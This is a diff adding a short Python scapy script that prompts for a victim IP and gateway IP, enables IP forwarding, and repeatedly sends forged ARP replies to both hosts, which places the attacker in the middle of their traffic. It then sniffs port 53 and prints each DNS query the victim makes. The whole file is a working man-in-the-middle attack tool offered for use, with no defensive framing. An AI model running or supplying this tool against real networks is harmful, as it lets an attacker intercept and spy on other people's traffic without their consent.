@@ -1,0 +1,50 @@
+#!/usr/bin/python
+
+from scapy.all import *
+import os, sys, time
+
+vIP = raw_input("Enter Victim IP >> ")
+gIP = raw_input("Enter Gateway IP >> ")
+iface = raw_input("Enter Interfae example: - eth0 >> ")
+
+try:
+	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+	print "[+] IP forward Done"
+except:
+	print"[-] Error while IP forwarding. Make sure that you are root"
+
+def vPois():	
+	try:
+		pkt = ARP(op=2, pdst=vIP, psrc=gIP, hwdst=getmacbyip(vIP))
+		send(pkt, verbose=0)
+	except KeyboardInterrupt:
+		sys.exit()
+
+def gPois():
+	try:	
+		pkt=ARP(op=2, pdst=gIP, psrc=vIP, hwdst=getmacbyip(gIP))
+		send(pkt, verbose=0)
+	except KeyboardInterrupt:
+		sys.exit()
+def dnshandler(pkt):
+	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr==0:
+		src_ip = pkt.getlayer(IP).src
+		dst_ip = pkt.getlayer(IP).dst
+		query = pkt.getlayer(DNS).qd.qname
+		print("[+] {} search for {}".format(src_ip, query))
+
+def main():
+	
+	try :
+		while True:
+			vPois()
+			time.sleep(0.75)
+			gPois()
+			time.sleep(0.75)
+			print "Poisoining Keep going"
+			sniff(iface=iface, filter='port 53', prn=dnshandler)
+	except KeyboardInterrupt:
+		sys.exit()
+
+if __name__ == "__main__":	
+	main()
